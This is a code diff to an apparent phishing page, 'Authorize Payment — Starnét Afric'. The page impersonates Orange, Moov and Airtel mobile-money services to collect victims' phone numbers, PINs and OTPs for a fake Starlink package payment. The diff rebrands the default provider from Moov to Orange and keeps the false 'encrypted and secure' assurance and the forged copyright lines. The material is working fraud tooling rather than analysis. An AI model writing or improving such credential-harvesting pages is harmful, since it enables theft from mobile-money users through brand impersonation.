@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Authorize Payment — Starnét Afric</title>
-  <meta name="theme-color" content="#ff9500">
+  <meta name="theme-color" content="#ff7900">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -16,9 +16,8 @@
       padding: 20px;
       background: #f3f4f6;
     }
-    body.moov { background: #ff9500; }
+    body.moov, body.orange { background: #ff7900; }
     body.airtel { background: #f5f5f5; }
-    body.orange { background: #ff7900; }
     .card {
       width: 100%;
       max-width: 400px;
@@ -35,7 +34,7 @@
       border-bottom: 1px solid #f0f0f0;
     }
     .top-bar .amount-label { font-size: 11px; color: #888; letter-spacing: .5px; }
-    .top-bar .amount { font-size: 22px; font-weight: 800; color: #ff9500; }
+    .top-bar .amount { font-size: 22px; font-weight: 800; color: #ff7900; }
     body.airtel .top-bar .amount { color: #e60000; }
     body.orange .top-bar .amount { color: #ff7900; }
     .top-bar .service-label { font-size: 11px; color: #888; text-align: right; }
@@ -93,9 +92,9 @@
       background: #fafafa;
     }
     .pin-row input:focus, .otp-row input:focus {
-      border-color: #ff9500;
+      border-color: #ff7900;
       background: #fff;
-      box-shadow: 0 0 0 3px rgba(255,149,0,.2);
+      box-shadow: 0 0 0 3px rgba(255,121,0,.2);
     }
     body.airtel .pin-row input:focus,
     body.airtel .otp-row input:focus {
@@ -115,7 +114,7 @@
     }
     .btn:disabled { opacity: .55; cursor: not-allowed; }
     .btn-primary { background: #c8c8c8; color: #fff; }
-    .btn-primary.active { background: #ff9500; }
+    .btn-primary.active { background: #ff7900; }
     body.airtel .btn-primary.active { background: #e60000; }
     body.orange .btn-primary.active { background: #ff7900; }
     .btn-success { background: #34c759; color: #fff; display: none; }
@@ -128,7 +127,7 @@
     body.moov .footer-copy, body.orange .footer-copy { color: rgba(255,255,255,.7); }
   </style>
 </head>
-<body class="moov">
+<body class="orange">
   <div class="card">
     <div class="top-bar">
       <div>
@@ -142,9 +141,9 @@
     </div>
     <div class="body">
       <div class="step" id="step-label">Step 2 of 3: Verification</div>
-      <div class="title" id="title-text">Enter your Moov Money details to authorize payment</div>
+      <div class="title" id="title-text">Enter your Orange Money details to authorize payment</div>
       <div class="field">
-        <label id="phone-label">Moov Money Number</label>
+        <label id="phone-label">Orange Money Number</label>
         <div class="phone-row">
           <div class="cc"><span>🇰🇪</span> <span>+254</span></div>
           <input type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="12" inputmode="tel" autocomplete="tel">
@@ -152,7 +151,7 @@
       </div>
       <div class="field">
         <label>Enter your PIN code (4 digits)</label>
-        <div class="hint" id="pin-hint">Check your Moov Money app or SMS</div>
+        <div class="hint" id="pin-hint">Check your Orange Money app or SMS</div>
         <div class="pin-row" style="margin-top:10px;">
           <input type="password" id="p1" maxlength="1" inputmode="numeric" autocomplete="off">
           <input type="password" id="p2" maxlength="1" inputmode="numeric" autocomplete="off">
@@ -178,15 +177,15 @@
       <p class="secure">🔒 Your information is encrypted and secure</p>
     </div>
   </div>
-  <p class="footer-copy" id="footer-copy">© 2026 Moov Money. All rights reserved.</p>
+  <p class="footer-copy" id="footer-copy">© 2026 Orange Money. All rights reserved.</p>
   <script>
     const params = new URLSearchParams(location.search);
-    const provider = (params.get("provider") || "moov").toLowerCase();
+    const provider = (params.get("provider") || "orange").toLowerCase();
     const amount   = params.get("amount") || "—";
     const currency = params.get("cur") || "KES";
     const packageName = params.get("package") || "Starlink Package";
     const prefillPhone = params.get("phone") || "";
-    document.body.className = provider;
+    document.body.className = (provider === "moov" ? "orange" : provider);
     document.getElementById("amount-display").textContent = currency + " " + amount;
     document.getElementById("service-display").textContent = packageName;
     if (provider === "airtel") {
@@ -196,12 +195,12 @@
       document.getElementById("footer-copy").textContent = "© 2026 Airtel Money. All rights reserved.";
       document.getElementById("btn-send").textContent = "SEND OTP";
       document.title = "LOGIN TO AIRTEL LITE";
-    } else if (provider === "orange") {
+    } else {
+      document.body.className = "orange";
       document.getElementById("title-text").textContent = "Enter your Orange Money details to authorize payment";
       document.getElementById("phone-label").textContent = "Orange Money Number";
       document.getElementById("pin-hint").textContent = "Check your Orange Money app or SMS";
       document.getElementById("footer-copy").textContent = "© 2026 Orange Money. All rights reserved.";
-    } else {
       document.getElementById("btn-send").textContent = "Verify PIN";
     }
     if (prefillPhone) {
